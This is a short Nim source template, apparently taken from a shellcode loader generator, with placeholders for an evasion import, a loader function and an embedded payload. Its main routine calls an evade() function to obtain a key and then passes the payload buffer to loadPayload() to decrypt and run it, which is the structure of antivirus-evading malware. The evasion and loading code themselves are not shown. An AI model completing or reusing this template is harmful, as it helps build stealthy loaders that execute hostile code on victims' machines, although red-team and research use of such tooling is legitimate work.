import {evade_import}
import {load_func}

var key: string = ""

{payload}

proc main() =
    key = evade(nil)

    loadPayload(addr(payload[0]), payload.len, key)

when isMainModule:
    main()
